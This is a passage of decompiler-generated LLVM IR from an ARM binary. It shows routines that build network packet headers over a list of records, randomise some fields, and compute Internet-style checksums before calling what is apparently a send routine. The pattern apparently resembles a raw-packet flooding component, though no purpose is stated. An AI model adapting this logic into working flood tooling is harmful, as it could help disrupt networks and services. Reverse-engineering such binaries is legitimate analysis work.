  %v4_cd28 = inttoptr i32 %v3_cd28 to i16*
  store i16 %v1_cd28, i16* %v4_cd28, align 2
  %v3_cd2c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_cd2c, i32* %r2.global-to-local, align 4
  %v3_cd30 = call i32 @function_f9ac(i32 %v1_cd1c, i32 %v3_cba4, i32 %v3_cd2c)
  %v3_cd34 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cd34, i32* %r3.global-to-local, align 4
  %v1_cd38 = add i32 %v3_cd34, 1
  store i32 %v1_cd38, i32* @r4, align 4
  %v1_cd3c = load i32, i32* @r8, align 4
  %v9_cd3c = icmp eq i32 %v1_cd38, %v1_cd3c
  store i1 %v9_cd3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cd38, i32* %stack_var_-44, align 4
  %v5_cd44 = icmp slt i32 %v1_cd38, %v1_cd3c
  br i1 %v5_cd44, label %dec_label_pc_cc4c, label %dec_label_pc_cd48.preheader

dec_label_pc_cd48.preheader:                      ; preds = %.thread, %dec_label_pc_cbf0
  %v0_cd4c.ph = phi i32 [ 0, %dec_label_pc_cbf0 ], [ %v1_cd3c, %.thread ]
  %v3_cd88 = icmp eq i32 %v3_cc00, 65535
  br label %dec_label_pc_cd48

dec_label_pc_cd48:                                ; preds = %dec_label_pc_cd48, %dec_label_pc_ce34, %dec_label_pc_cd48.preheader
  %v0_cd4c = phi i32 [ %v0_cd4c.ph, %dec_label_pc_cd48.preheader ], [ 0, %dec_label_pc_ce34 ], [ 0, %dec_label_pc_cd48 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_cd4c = icmp eq i32 %v0_cd4c, 0
  store i1 %v2_cd4c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_cd4c, label %dec_label_pc_cd48, label %dec_label_pc_cd58

dec_label_pc_cd58:                                ; preds = %dec_label_pc_cd48, %dec_label_pc_ce34
  br label %dec_label_pc_cd5c

dec_label_pc_cd5c:                                ; preds = %dec_label_pc_cda8, %dec_label_pc_cd58
  %v1_cd6c = phi i32 [ %v1_ce24, %dec_label_pc_cda8 ], [ 0, %dec_label_pc_cd58 ]
  %v5_cd60 = mul i32 %v1_cd6c, 24
  %v1_cd64 = load i32, i32* @sl, align 4
  %v2_cd64 = add i32 %v1_cd64, %v5_cd60
  store i32 %v2_cd64, i32* %r3.global-to-local, align 4
  %v1_cd68 = add i32 %v2_cd64, 20
  %v2_cd68 = inttoptr i32 %v1_cd68 to i8*
  %v3_cd68 = load i8, i8* %v2_cd68, align 1
  %v4_cd68 = zext i8 %v3_cd68 to i32
  store i32 %v4_cd68, i32* %r2.global-to-local, align 4
  %v0_cd6c = load i32, i32* @fp, align 4
  %v4_cd6c = mul i32 %v1_cd6c, 4
  %v5_cd6c = add i32 %v0_cd6c, %v4_cd6c
  %v6_cd6c = inttoptr i32 %v5_cd6c to i32*
  %v7_cd6c = load i32, i32* %v6_cd6c, align 4
  store i32 %v7_cd6c, i32* @r5, align 4
  %v7_cd74 = icmp eq i8 %v3_cd68, 31
  store i1 %v7_cd74, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_cd7c = add i32 %v7_cd6c, 20
  store i32 %v1_cd7c, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_cd68, 32
  br i1 %tmp40, label %dec_label_pc_ce48, label %dec_label_pc_cd84

dec_label_pc_cd84:                                ; preds = %dec_label_pc_cd5c
  store i32 %v3_cc00, i32* %r3.global-to-local, align 4
  store i1 %v3_cd88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_cd88, label %dec_label_pc_cea8, label %dec_label_pc_cd90

dec_label_pc_cd90:                                ; preds = %dec_label_pc_ce48, %dec_label_pc_cd84
  %v1_cd94 = phi i32 [ %v1_cea0, %dec_label_pc_ce48 ], [ 65535, %dec_label_pc_cd84 ]
  store i32 %v3_cc04, i32* %ip.global-to-local, align 4
  %v9_cd94 = icmp eq i32 %v3_cc04, %v1_cd94
  store i1 %v9_cd94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cd94, label %dec_label_pc_cebc, label %dec_label_pc_cd9c

dec_label_pc_cd9c:                                ; preds = %dec_label_pc_cea8.dec_label_pc_cd9c_crit_edge, %dec_label_pc_cd90
  %v1_cda0 = phi i32 [ %v1_cda0.pre, %dec_label_pc_cea8.dec_label_pc_cd9c_crit_edge ], [ %v1_cd94, %dec_label_pc_cd90 ]
  %v9_cda0 = icmp eq i32 %v3_cc08, %v1_cda0
  store i1 %v9_cda0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cda0, label %dec_label_pc_ced0, label %dec_label_pc_cda8

dec_label_pc_cda8:                                ; preds = %dec_label_pc_cebc, %dec_label_pc_cd9c, %dec_label_pc_ced0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_cdac = load i32, i32* @r5, align 4
  %v3_cdac = add i32 %v2_cdac, 10
  %v4_cdac = inttoptr i32 %v3_cdac to i16*
  store i16 0, i16* %v4_cdac, align 2
  %v0_cdb4 = load i32, i32* @r5, align 4
  store i32 %v0_cdb4, i32* @r0, align 4
  %v2_cdb8 = call i32 @function_cef4(i32 %v0_cdb4, i32 20)
  %v3_cdb8 = trunc i32 %v2_cdb8 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cdc0 = load i32, i32* @r5, align 4
  %v4_cdc0 = add i32 %v3_cdc0, 10
  %v5_cdc0 = inttoptr i32 %v4_cdc0 to i16*
  store i16 %v3_cdb8, i16* %v5_cdc0, align 2
  %v0_cdc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_cdc4 = trunc i32 %v0_cdc4 to i16
  %v2_cdc4 = load i32, i32* @r6, align 4
  %v3_cdc4 = add i32 %v2_cdc4, 6
  %v4_cdc4 = inttoptr i32 %v3_cdc4 to i16*
  store i16 %v1_cdc4, i16* %v4_cdc4, align 2
  %v3_cdc8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_cdc8, i32* %r3.global-to-local, align 4
  %v0_cdcc = load i32, i32* @r6, align 4
  store i32 %v0_cdcc, i32* @r1, align 4
  %v1_cdd0 = add i32 %v0_cdcc, 4
  %v2_cdd0 = inttoptr i32 %v1_cdd0 to i16*
  %v3_cdd0 = load i16, i16* %v2_cdd0, align 2
  %v4_cdd0 = zext i16 %v3_cdd0 to i32
  store i32 %v4_cdd0, i32* %r2.global-to-local, align 4
  %v1_cdd4 = add i32 %v3_cdc8, 12
  store i32 %v1_cdd4, i32* %r3.global-to-local, align 4
  %v0_cdd8 = load i32, i32* @r5, align 4
  %v4_cddc = call i32 @function_cf44(i32 %v0_cdd8, i32 %v0_cdcc, i32 %v4_cdd0, i32 %v1_cdd4)
  %v5_cddc = trunc i32 %v4_cddc to i16
  %v3_cde0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cde0, i32* %r3.global-to-local, align 4
  %v3_cde4 = mul i32 %v3_cde0, 32
  store i32 %v3_cde4, i32* %lr.global-to-local, align 4
  %v3_cde8 = load i32, i32* @r6, align 4
  %v4_cde8 = add i32 %v3_cde8, 6
  %v5_cde8 = inttoptr i32 %v4_cde8 to i16*
  store i16 %v5_cddc, i16* %v5_cde8, align 2
  %v0_cdec = load i32, i32* %lr.global-to-local, align 4
  %v1_cdec = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_cdec, -8
  %v5_cdec = add i32 %v0_cdec, %tmp41
  store i32 %v5_cdec, i32* %lr.global-to-local, align 4
  %v0_cdf0 = load i32, i32* @r6, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 2
  %v2_cdf0 = inttoptr i32 %v1_cdf0 to i16*
  %v3_cdf0 = load i16, i16* %v2_cdf0, align 2
  %v3_cdf4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_cdf4, i32* %r2.global-to-local, align 4
  %v1_cdf8 = load i32, i32* @sl, align 4
  %v2_cdf8 = add i32 %v1_cdf8, %v5_cdec
  store i32 %v2_cdf8, i32* @lr, align 4
  %v3_cdfc = add i32 %v2_cdf8, 2
  %v4_cdfc = inttoptr i32 %v3_cdfc to i16*
  store i16 %v3_cdf0, i16* %v4_cdfc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ce08 = load i32, i32* @r5, align 4
  %v0_ce0c = load i32, i32* %r2.global-to-local, align 4
  %v1_ce0c = add i32 %v0_ce0c, 32
  store i32 %v1_ce0c, i32* %r2.global-to-local, align 4
  %v0_ce10 = load i32, i32* @sb, align 4
  %v0_ce14 = load i32, i32* @lr, align 4
  %v6_ce1c = call i32 @function_10d6c(i32 %v0_ce10, i32 %v0_ce08, i32 %v1_ce0c, i32 16384, i32 %v0_ce14, i32 16)
  %v3_ce20 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ce20, i32* %r3.global-to-local, align 4
  %v1_ce24 = add i32 %v3_ce20, 1
  %v1_ce28 = load i32, i32* @r8, align 4
  %v9_ce28 = icmp eq i32 %v1_ce24, %v1_ce28
  store i1 %v9_ce28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ce24, i32* %stack_var_-44, align 4
  %v5_ce30 = icmp slt i32 %v1_ce24, %v1_ce28
  br i1 %v5_ce30, label %dec_label_pc_cd5c, label %dec_label_pc_ce34

dec_label_pc_ce34:                                ; preds = %dec_label_pc_cda8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ce38 = icmp eq i32 %v1_ce28, 0
  store i1 %v2_ce38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ce38, label %dec_label_pc_cd48, label %dec_label_pc_cd58

dec_label_pc_ce48:                                ; preds = %dec_label_pc_cd5c
  %v1_ce48 = add i32 %v2_cd64, 16
  %v2_ce48 = inttoptr i32 %v1_ce48 to i32*
  %v3_ce48 = load i32, i32* %v2_ce48, align 4
  store i32 %v3_ce48, i32* @r4, align 4
  %v0_ce4c = call i32 @function_e7dc()
  %v3_ce50 = load i32, i32* %stack_var_-44, align 4
  %v5_ce58 = mul i32 %v3_ce50, 24
  %v0_ce5c = load i32, i32* @r4, align 4
  %v1_ce5c = and i32 %v0_ce5c, 16711680
  store i32 %v1_ce5c, i32* %ip.global-to-local, align 4
  %v3_ce60 = udiv i32 %v0_ce5c, 16777216
  %v4_ce64 = udiv i32 %v1_ce5c, 256
  %v5_ce64 = or i32 %v4_ce64, %v3_ce60
  store i32 %v5_ce64, i32* %r2.global-to-local, align 4
  %v1_ce68 = load i32, i32* @sl, align 4
  %v2_ce68 = add i32 %v1_ce68, %v5_ce58
  %v1_ce6c = and i32 %v0_ce5c, 65280
  store i32 %v1_ce6c, i32* %r3.global-to-local, align 4
  %v1_ce70 = add i32 %v2_ce68, 20
  %v2_ce70 = inttoptr i32 %v1_ce70 to i8*
  %v3_ce70 = load i8, i8* %v2_ce70, align 1
  %v4_ce70 = zext i8 %v3_ce70 to i32
  store i32 %v4_ce70, i32* %ip.global-to-local, align 4
  %v5_ce78 = call i32 @llvm.bswap.i32(i32 %v0_ce5c)
  %v7_ce7c = lshr i32 %v0_ce4c, %v4_ce70
  %v8_ce7c = add i32 %v7_ce7c, %v5_ce78
  store i32 %v8_ce7c, i32* %r2.global-to-local, align 4
  %v5_ce94 = call i32 @llvm.bswap.i32(i32 %v8_ce7c)
  %v1_ce98 = load i32, i32* @r5, align 4
  %v2_ce98 = add i32 %v1_ce98, 16
  %v3_ce98 = inttoptr i32 %v2_ce98 to i32*
  store i32 %v5_ce94, i32* %v3_ce98, align 4
  store i32 %v3_cc00, i32* %r3.global-to-local, align 4
  %v1_cea0 = load i32, i32* @r7, align 4
  %v9_cea0 = icmp eq i32 %v3_cc00, %v1_cea0
  store i1 %v9_cea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cea0, label %dec_label_pc_cea8, label %dec_label_pc_cd90

dec_label_pc_cea8:                                ; preds = %dec_label_pc_ce48, %dec_label_pc_cd84
  %v0_cea8 = call i32 @function_e7dc()
  %v1_cea8 = trunc i32 %v0_cea8 to i16
  store i32 %v3_cc04, i32* %ip.global-to-local, align 4
  %v1_ceb0 = load i32, i32* @r7, align 4
  %v9_ceb0 = icmp eq i32 %v3_cc04, %v1_ceb0
  store i1 %v9_ceb0, i1* %cpsr_z.global-to-local, align 1
  %v3_ceb4 = load i32, i32* @r5, align 4
  %v4_ceb4 = add i32 %v3_ceb4, 4
  %v5_ceb4 = inttoptr i32 %v4_ceb4 to i16*
  store i16 %v1_cea8, i16* %v5_ceb4, align 2
  br i1 %v9_ceb0, label %dec_label_pc_cebc, label %dec_label_pc_cea8.dec_label_pc_cd9c_crit_edge

dec_label_pc_cea8.dec_label_pc_cd9c_crit_edge:    ; preds = %dec_label_pc_cea8
  %v1_cda0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cd9c

dec_label_pc_cebc:                                ; preds = %dec_label_pc_cea8, %dec_label_pc_cd90
  %v0_cebc = call i32 @function_e7dc()
  %v1_cebc = trunc i32 %v0_cebc to i16
  %v1_cec4 = load i32, i32* @r7, align 4
  %v9_cec4 = icmp eq i32 %v3_cc08, %v1_cec4
  store i1 %v9_cec4, i1* %cpsr_z.global-to-local, align 1
  %v3_cec8 = load i32, i32* @r5, align 4
  %v4_cec8 = add i32 %v3_cec8, 20
  %v5_cec8 = inttoptr i32 %v4_cec8 to i16*
  store i16 %v1_cebc, i16* %v5_cec8, align 2
  br i1 %v9_cec4, label %dec_label_pc_ced0, label %dec_label_pc_cda8

dec_label_pc_ced0:                                ; preds = %dec_label_pc_cebc, %dec_label_pc_cd9c
  %v0_ced0 = call i32 @function_e7dc()
  %v1_ced0 = trunc i32 %v0_ced0 to i16
  %v3_ced4 = load i32, i32* @r6, align 4
  %v4_ced4 = add i32 %v3_ced4, 2
  %v5_ced4 = inttoptr i32 %v4_ced4 to i16*
  store i16 %v1_ced0, i16* %v5_ced4, align 2
  br label %dec_label_pc_cda8

dec_label_pc_cedc:                                ; preds = %dec_label_pc_cbc8
  %v0_cedc = load i32, i32* @sb, align 4
  %v1_cee0 = call i32 @function_10608(i32 %v0_cedc)
  br label %dec_label_pc_cee4

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cabc, %dec_label_pc_cedc
  %v1_ceec = phi i32 [ %v3_cbb8, %dec_label_pc_cabc ], [ %v1_cee0, %dec_label_pc_cedc ]
  store i32 %v3_cabc, i32* %r4.global-to-local, align 4
  store i32 %v27_cabc, i32* %lr.global-to-local, align 4
  ret i32 %v1_ceec

; uselistorder directives
  uselistorder i32 %v1_cea0, { 1, 0 }
  uselistorder i32 %v0_ce5c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_ce24, { 2, 0, 3, 1 }
  uselistorder i32 %v5_cdec, { 1, 0 }
  uselistorder i1 %v3_cd88, { 1, 0 }
  uselistorder i32 %v1_cd38, { 1, 0, 2, 3 }
  uselistorder i32 %v3_cca0, { 1, 0 }
  uselistorder i32 %v3_cc38, { 1, 0 }
  uselistorder i32 %v3_cc34, { 1, 0 }
  uselistorder i32 %v0_cbf8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_cbf4, { 1, 0, 2 }
  uselistorder i32 %v0_cbf0, { 1, 0, 3, 2 }
  uselistorder i1 %v7_cbe8, { 1, 0 }
  uselistorder i1 %v7_cbbc, { 1, 0 }
  uselistorder i32 %v3_cbb8, { 1, 2, 3, 0 }
  uselistorder i32 %v1_cb58, { 1, 0 }
  uselistorder i32 %v5_cb2c, { 1, 0 }
  uselistorder i32 %v5_caf0, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 0 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 9, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10d6c, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @function_cf44, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 (i32, i32)* @function_cef4, { 0, 7, 6, 5, 2, 1, 4, 3 }
  uselistorder i8 31, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i16 64, { 1, 2, 3, 0 }
  uselistorder i8 5, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i8 16, { 0, 9, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_a300, { 67, 68, 69, 70, 71, 72, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 73, 74 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_cee4, { 1, 0 }
  uselistorder label %dec_label_pc_cda8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cd58, { 1, 0 }
  uselistorder label %dec_label_pc_cd48, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_cef4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cef4:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_cf18, label %dec_label_pc_cf00

dec_label_pc_cf00:                                ; preds = %dec_label_pc_cef4
  %v0_cf08.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_cf04

dec_label_pc_cf04:                                ; preds = %dec_label_pc_cf04, %dec_label_pc_cf00
  %v0_cf10 = phi i32 [ %v2_cf10, %dec_label_pc_cf04 ], [ 0, %dec_label_pc_cf00 ]
  %v0_cf08 = phi i32 [ %v5_cf08, %dec_label_pc_cf04 ], [ %v0_cf08.pre, %dec_label_pc_cf00 ]
  %v0_cf04 = phi i32 [ %v1_cf04, %dec_label_pc_cf04 ], [ %arg1, %dec_label_pc_cf00 ]
  %v1_cf04 = add i32 %v0_cf04, -2
  %v1_cf08 = inttoptr i32 %v0_cf08 to i16*
  %v2_cf08 = load i16, i16* %v1_cf08, align 2
  %v3_cf08 = zext i16 %v2_cf08 to i32
  %v5_cf08 = add i32 %v0_cf08, -2
  store i32 %v5_cf08, i32* @r0, align 4
  %v2_cf10 = add i32 %v3_cf08, %v0_cf10
  %v1_cf04.cmp = icmp ugt i32 %v1_cf04, 1
  br i1 %v1_cf04.cmp, label %dec_label_pc_cf04, label %dec_label_pc_cf18.loopexit

dec_label_pc_cf18.loopexit:                       ; preds = %dec_label_pc_cf04
  br label %dec_label_pc_cf18

dec_label_pc_cf18:                                ; preds = %dec_label_pc_cef4, %dec_label_pc_cf18.loopexit
  %v1_cf20 = phi i32 [ %v2_cf10, %dec_label_pc_cf18.loopexit ], [ 0, %dec_label_pc_cef4 ]
  %v0_cf18 = phi i32 [ %v1_cf04, %dec_label_pc_cf18.loopexit ], [ %arg1, %dec_label_pc_cef4 ]
  %v7_cf18 = icmp eq i32 %v0_cf18, 1
  br i1 %v7_cf18, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_cf18
  %v1_cf1c = load i32, i32* @r0, align 4
  %v2_cf1c = inttoptr i32 %v1_cf1c to i8*
  %v3_cf1c = load i8, i8* %v2_cf1c, align 1
  %v4_cf1c = zext i8 %v3_cf1c to i32
  %v3_cf20 = add i32 %v1_cf20, %v4_cf1c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_cf18, %bb
  %v0_cf24 = phi i32 [ %v1_cf20, %dec_label_pc_cf18 ], [ %v3_cf20, %bb ]
  %v3_cf28 = urem i32 %v0_cf24, 65536
  %v4_cf2c = udiv i32 %v0_cf24, 65536
  %v5_cf2c = add nuw nsw i32 %v4_cf2c, %v3_cf28
  %v4_cf30 = udiv i32 %v5_cf2c, 65536
  %v5_cf30 = add nuw nsw i32 %v4_cf30, %v5_cf2c
  %v1_cf34 = urem i32 %v5_cf30, 65536
  %v3_cf3c = xor i32 %v1_cf34, 65535
  ret i32 %v3_cf3c

; uselistorder directives
  uselistorder i32 %v5_cf2c, { 1, 0 }
  uselistorder i32 %v5_cf08, { 1, 0 }
  uselistorder i32 %v1_cf04, { 1, 0, 2 }
  uselistorder i32 %v0_cf08, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_cf18, { 1, 0 }
}

define i32 @function_cf44(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_cf44:
  %v1_cf54 = add i32 %arg1, 12
  %v2_cf54 = inttoptr i32 %v1_cf54 to i32*
  %v3_cf54 = load i32, i32* %v2_cf54, align 4
  %v1_cf58 = add i32 %arg1, 16
  %v2_cf58 = inttoptr i32 %v1_cf58 to i32*
  %v3_cf58 = load i32, i32* %v2_cf58, align 4
  %v7_cf5c = icmp sgt i32 %arg3, 1
  br i1 %v7_cf5c, label %dec_label_pc_cf68.preheader, label %dec_label_pc_cf7c

dec_label_pc_cf68.preheader:                      ; preds = %dec_label_pc_cf44
  %v0_cf6c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_cf68

dec_label_pc_cf68:                                ; preds = %dec_label_pc_cf68.preheader, %dec_label_pc_cf68
  %v0_cf74 = phi i32 [ 0, %dec_label_pc_cf68.preheader ], [ %v2_cf74, %dec_label_pc_cf68 ]
  %v0_cf6c = phi i32 [ %v0_cf6c.pre, %dec_label_pc_cf68.preheader ], [ %v5_cf6c, %dec_label_pc_cf68 ]
  %v0_cf68 = phi i32 [ %arg3, %dec_label_pc_cf68.preheader ], [ %v1_cf68, %dec_label_pc_cf68 ]
  %v1_cf68 = add nsw i32 %v0_cf68, -2
  %v1_cf6c = inttoptr i32 %v0_cf6c to i16*
  %v2_cf6c = load i16, i16* %v1_cf6c, align 2
  %v3_cf6c = zext i16 %v2_cf6c to i32
  %v5_cf6c = add i32 %v0_cf6c, -2
  store i32 %v5_cf6c, i32* @r1, align 4
  %v2_cf74 = add i32 %v3_cf6c, %v0_cf74
  %v8_cf78 = icmp sgt i32 %v1_cf68, 1
  br i1 %v8_cf78, label %dec_label_pc_cf68, label %dec_label_pc_cf7c.loopexit

dec_label_pc_cf7c.loopexit:                       ; preds = %dec_label_pc_cf68
  br label %dec_label_pc_cf7c

dec_label_pc_cf7c:                                ; preds = %dec_label_pc_cf7c.loopexit, %dec_label_pc_cf44
  %v1_cf88 = phi i32 [ %v2_cf74, %dec_label_pc_cf7c.loopexit ], [ 0, %dec_label_pc_cf44 ]
  %v0_cf7c = phi i32 [ %v1_cf68, %dec_label_pc_cf7c.loopexit ], [ %arg3, %dec_label_pc_cf44 ]
  %v7_cf7c = icmp eq i32 %v0_cf7c, 1
  br i1 %v7_cf7c, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_cf7c
  br label %bb19

bb:                                               ; preds = %dec_label_pc_cf7c
  %v1_cf80 = load i32, i32* @r1, align 4
  %v2_cf80 = inttoptr i32 %v1_cf80 to i8*
  %v3_cf80 = load i8, i8* %v2_cf80, align 1
  %v4_cf80 = zext i8 %v3_cf80 to i32
  %v3_cf88 = add i32 %v4_cf80, %v1_cf88
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_cfb0 = phi i32 [ %v1_cf88, %.thread ], [ %v3_cf88, %bb ]
  %v0_cf90 = mul i32 %v3_cf54, 65536
  %v3_cf90 = udiv i32 %v0_cf90, 65536
  %v3_cf94 = urem i32 %v3_cf58, 65536
  %v4_cf9c = udiv i32 %v3_cf54, 65536
  %v2_cf98 = add nuw nsw i32 %v3_cf94, %v4_cf9c
  %v5_cf9c = add nuw nsw i32 %v2_cf98, %v3_cf90
  %v1_cfa0 = add i32 %arg1, 9
  %v2_cfa0 = inttoptr i32 %v1_cfa0 to i8*
  %v3_cfa0 = load i8, i8* %v2_cfa0, align 1
  %v4_cfa0 = zext i8 %v3_cfa0 to i32
  %v4_cfa4 = udiv i32 %v3_cf58, 65536
  %v3_cfac = mul nuw nsw i32 %v4_cfa0, 256
  %v5_cfa4 = add i32 %v4_cfa4, %arg2
  %v2_cfa8 = add i32 %v5_cfa4, %v1_cfb0
  %v2_cfb0 = add i32 %v2_cfa8, %v5_cf9c
  %v2_cfb4 = add i32 %v2_cfb0, %v3_cfac
  %tmp = icmp ult i32 %v2_cfb4, 65536
  br i1 %tmp, label %dec_label_pc_cfd4, label %dec_label_pc_cfc0

dec_label_pc_cfc0:                                ; preds = %bb19, %dec_label_pc_cfc0
  %v2_cfc85 = phi i32 [ %v2_cfc8, %dec_label_pc_cfc0 ], [ %v2_cfb4, %bb19 ]
  %v3_cfcc6.in = phi i32 [ %v2_cfc8, %dec_label_pc_cfc0 ], [ %v2_cfb4, %bb19 ]
  %v3_cfcc6 = udiv i32 %v3_cfcc6.in, 65536
  %v3_cfc4 = urem i32 %v2_cfc85, 65536
  %v2_cfc8 = add nuw nsw i32 %v3_cfc4, %v3_cfcc6
  %tmp20 = icmp ult i32 %v2_cfc8, 65536
  br i1 %tmp20, label %dec_label_pc_cfd4.loopexit, label %dec_label_pc_cfc0

dec_label_pc_cfd4.loopexit:                       ; preds = %dec_label_pc_cfc0
  br label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_cfd4.loopexit, %bb19
  %v0_cfd4 = phi i32 [ %v2_cfc8, %dec_label_pc_cfd4.loopexit ], [ %v2_cfb4, %bb19 ]
  %v1_cfd4 = urem i32 %v0_cfd4, 65536
  %v3_cfdc = xor i32 %v1_cfd4, 65535
  ret i32 %v3_cfdc

; uselistorder directives
  uselistorder i32 %v2_cfc8, { 2, 1, 3, 0 }
  uselistorder i32 %v2_cfb4, { 3, 0, 2, 1 }
  uselistorder i32 %v1_cf88, { 1, 0 }
  uselistorder i32 %v5_cf6c, { 1, 0 }
  uselistorder i32 %v0_cf6c, { 1, 0 }
  uselistorder i32 %v3_cf54, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cfc0, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_cf68, { 1, 0 }
}

define i32 @function_cfe8(i32 %arg1) local_unnamed_addr {
dec_label_pc_cfe8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_cfe8 = load i32, i32* @r4, align 4
  %v6_cfe8 = load i32, i32* @r5, align 4
  %v9_cfe8 = load i32, i32* @r6, align 4
  %v12_cfe8 = load i32, i32* @r7, align 4
  %v15_cfe8 = load i32, i32* @r8, align 4
  %v18_cfe8 = load i32, i32* @sb, align 4
  %v21_cfe8 = load i32, i32* @sl, align 4
  %v24_cfe8 = load i32, i32* @fp, align 4
  %v27_cfe8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_d004 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_d004, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_d030 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_d030, i32* @fp, align 4
  %v3_d03c = call i32 @function_10a80(i8* nonnull %stack_var_-585, i32 0)
  %v2_d040 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_d040, i32* @sl, align 4
  %v0_d044 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_d050 = bitcast i32* %stack_var_-8777 to i8*
  %v3_d050 = call i32 @function_10a80(i8* %v2_d050, i32 %v0_d044)
  %v0_d058 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_d064 = bitcast i32* %stack_var_-4681 to i8*
  %v3_d064 = call i32 @function_10a80(i8* %v2_d064, i32 %v0_d058)
  %v2_d068 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_d068, i32* @sb, align 4
  %v0_d06c = load i32, i32* %r4.global-to-local, align 4
  %v3_d06c = udiv i32 %v0_d06c, 256
  %v1_d070 = urem i32 %v0_d06c, 256
  store i32 %v1_d070, i32* @r4, align 4
  %v3_d080 = trunc i32 %v3_d06c to i8
  %v4_d080 = call i32 @function_fe30(i8 %v3_d080, i32 16, i32 %v2_d068)
  %v2_d088 = call i32 @function_f93c(i8* nonnull %stack_var_-72)
  %v7_d08c = icmp eq i32 %v2_d088, 2
  br i1 %v7_d08c, label %dec_label_pc_d520, label %dec_label_pc_d094

